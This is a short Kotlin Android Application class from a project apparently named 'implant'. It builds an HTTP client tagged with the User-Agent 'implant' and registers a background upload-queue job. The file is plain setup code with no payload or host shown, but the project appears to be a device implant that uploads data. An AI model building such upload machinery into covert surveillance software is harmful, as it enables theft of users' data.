package com.cooperthecoder.implant

import android.app.Application
import com.cooperthecoder.implant.command.UploadQueueJob
import com.evernote.android.job.JobManager
import okhttp3.Interceptor
import okhttp3.OkHttpClient

class App: Application() {

    companion object {
        lateinit var instance: App
    }

    val client: OkHttpClient by lazy {
        val client = OkHttpClient()
        client.interceptors().add(Interceptor {
            val original = it.request()
            val request = original.newBuilder()
                    .addHeader("User-Agent", "implant")
                    .build()

            it.proceed(request)

        })
        client
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        JobManager.create(this).addJobCreator {
            when (it) {
                UploadQueueJob.JOB_NAME -> {
                    UploadQueueJob()
                }

                else -> {
                    null
                }
            }
        }
    }
}

